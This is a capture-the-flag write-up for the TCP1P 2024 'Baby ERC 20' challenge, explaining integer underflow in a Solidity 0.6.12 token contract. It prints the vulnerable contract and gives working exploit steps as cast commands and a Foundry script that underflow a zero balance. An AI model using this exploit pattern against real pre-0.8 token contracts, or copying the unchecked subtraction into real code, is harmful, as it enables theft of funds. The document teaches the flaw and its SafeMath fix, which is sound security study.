+++
date = '2024-10-23T01:29:00+05:30'
draft = false
title = 'Baby ERC 20'
categories=["Blockchain"]
series="TCP1P-2024"
tags=["ERC20"]
+++

# Writeup for BABY ERC-20

- Hello h4ck3r, welcome to the world of smart contract hacking. In order to understand this writeup you need to understand foundry.

### Challenge Description

No Description given

### Key Concepts to Learn

In order to solve this challenge we need to understand `overflows` and `underflows` in solidity.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract overflow_underflow{
    uint8 overflow=255;
    uint8 underflow=0;

    function increment()public{
        overflow++;
    }

    function decrement()public{
        underflow--;
    }

}
```

The above contract is a good example to understand overflows and underflows. The state variable `overflow` is set to 255, and the state variable `underflow` is set to 0.

`uint8` technically refers to 8 bits, which means it can store a maximum value of 255. If we increase the value of the variable after 255, it will start from zero again. In the above contract, if we call `increment()` once, then `overflow` will be set to zero. If we call it again, it will be set to 1, and so on.

The minimum value of `uint8` is 0. But if we decrease a `uint8` variable after zero, it will become 255. In the above contract, if we call `decrement()` once, then `underflow` is set to 255. If we call it again, `underflow` will be set to 254, and so on.

For solidity versions greater than 0.8.0, overflow and underflows are implicitly handled. But for solidity versions less than 0.8.0, we need to explicitly handle the overflows and underflows.There is a library named SafeMath to handle overflows and underflows for versions less than 0.8.0.

If you are new to overflows and underflows, I suggest you go to [Remix](https://remix.ethereum.org/) and try out the example by deploying in remix local VM's.

### Exploit

The below are the source contracts.

1. **Setup** contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import {HCOIN} from "./HCOIN.sol";

contract Setup {
    HCOIN public coin;
    address player;

    constructor() public payable {
        require(msg.value == 1 ether);
        coin = new HCOIN();
        coin.deposit{value: 1 ether}();
    }

    function setPlayer(address _player) public {
        require(_player == msg.sender, "Player must be the same with the sender");
        require(_player == tx.origin, "Player must be a valid Wallet/EOA");
        player = _player;
    }

    function isSolved() public view returns (bool) {
        return coin.balanceOf(player) > 1000 ether; // im rich :D
    }
}

```

2. **HCOIN** contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import "./Ownable.sol";

contract HCOIN is Ownable {
    string public constant name = "HackerikaCoin";
    string public constant symbol = "HCOIN";
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Deposit(address indexed to, uint256 value);

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[msg.sender] - _value >= 0, "Insufficient Balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public onlyOwner returns (bool success) {
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[msg.sender] - _value >= 0, "Insufficient Balance");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    fallback() external payable {
        deposit();
    }
}

```

3. Ownable contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
 * @dev Provides basic authorization control functions. This simplifies
 * the implementation of "user permissions".
 */
contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor() internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param newOwner The address to transfer ownership to.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

```

In this challenge our task is make `isSolved()` function return true.

```solidity
function isSolved() public view returns (bool) {
    return coin.balanceOf(player) > 1000 ether; // im rich :D
    }
```

The function `isSolved()` is checking if the player has enough balance in the `HCOIN` contract or not. If the player's balance is more than `1000 ether`, it will return true.

Now let's understand some functions in the HCOIN contract. The blanceOf variable is changed in three functions.

```solidity
function deposit() public payable {
    balanceOf[msg.sender] += msg.value;
    emit Deposit(msg.sender, msg.value);
}
```

The function `deposit()` will increment the `balanceOf` of `msg.sender` (caller) by `msg.value` (if any ether is sent during the call). We can call this function and make our balance `1001 ether` `HCOIN` tokens only if we have `1001 ETH`. Since the challenge creator has given us less than `1001 ether`, we need to look into other functions.

```solidity
function transfer(address _to, uint256 _value) public returns (bool success) {
    require(_to != address(0), "ERC20: transfer to the zero address");
    require(balanceOf[msg.sender] - _value >= 0, "Insufficient Balance");
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
    emit Transfer(msg.sender, _to, _value);
    return true;
}
```

The function `transfer()` takes two arguments: address \_to and uint256 \_value. It first checks if \_to is a zero address. If it is, the function call will revert. Otherwise, it checks if msg.sender has enough balance to transfer the specified amount. If msg.sender has enough balance, the function decreases the msg.sender balance by \_value and increases the \_to balance by \_value.

The Solidity compiler version used for the HCOIN contract is 0.6.12, which means it is vulnerable to overflows and underflows. They also haven't used the SafeMath library to prevent overflows. So, the contract is vulnerable to overflows and underflows.

Let's check how this function will work if the balance of `msg.sender` is 0 and they are transferring 1 wei to another address.

1. `balanceOf[msg.sender]` will return 0 and `_value` is 1.
2. `0 - 1` will return `2**256 - 1` which is greater than 0.
3. `balanceOf[msg.sender] -= _value`. This will set `msg.sender` balance to `2**256 - 1 wei` which is equivalent to `115792089237316195423570985008687907853269984665640564039457.584007913129639935 ether`.
4. `balanceOf[_to] += _value`. This will set `_to` balance to 1 wei.

So from our account if we send 1 wei to any address then we will have a balance of 115792089237316195423570985008687907853269984665640564039457.584007913129639935 ether HCOIN tokens and our challenge will be solved.

```solidity
function setPlayer(address _player) public {
    require(_player == msg.sender, "Player must be the same with the sender");
    require(_player == tx.origin, "Player must be a valid Wallet/EOA");
    player = _player;
}
```

Once the transfer is completed we need call setPlayer() function in Setup.sol by passing our address as an argument.

We can complete this transaction in two ways. One way is by making direct transactions using `cast`, and the second way is by writing a script.

**Method-1**

In our instance, they are giving only the Setup contract address, but we need to interact with the HCOIN contract first. Since `coin()` in Setup is a public variable, we can get the `HCOIN` contract address by making a call to `coin()`.

```shell
$ cast call $SETUP_ADDR "coin()" --rpc-url $RPC_URL

```

`SETUP_ADDR` is the Setup contract address. Now we need to call the `transfer()` function.

```shell
$ cast send $HCOIN_ADDR "transfer(address,uint256)" 0xD896A0672D9E650B18524139293e4CDcA1E44c9e 1 --rpc-url $RPC_URL --interactive
```

`0x90bdc08cf595a862268cb0f12ec5956178e6fbf0` is the address of the HCOIN contract.

```shell
$ cast send $SETUP_ADDR "setPlayer(address)" $PLAYER_ADDR --rpc-url $RPC_URL --interactive
```

Once this transaction completes, the challenge will be solved.

**Method-2**

We can also solve this challenge by writing a script.

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Setup, HCOIN} from "src/Setup.sol";
import {ExploitHCOIN} from "./ExploitHCOIN.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Setup setup = Setup(//__YOUR__SETUP__ADDRESS);
        HCOIN hcoin = setup.coin();
        hcoin.transfer(address(1), 1 ether);
        setup.setPlayer(msg.sender);
        require(setup.isSolved(), "Exploit Failed");
        vm.stopBroadcast();
    }
}
```

```shell
$ forge script script/ExploitScript.s.sol:ExploitScript --rpc-url $RPC_URL -i 1 --broadcast --sender $PLAYER
```

Once you compile and run the script the challenge will be solved. If you face any copiler version issues set `solc_version = "0.6.12"` in foundry.toml

**Flag:** `TCP1P{https://x.com/0xCharlesWang/status/1782350590946799888}`

### Key Takeaways

For solidity versions less than 0.8.0, we need to explicitly handle the overflows and underflows. We can use the [SafeMath](https://github.com/aave/protocol-v2/blob/master/contracts/dependencies/openzeppelin/contracts/SafeMath.sol) library to overcome those.

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>
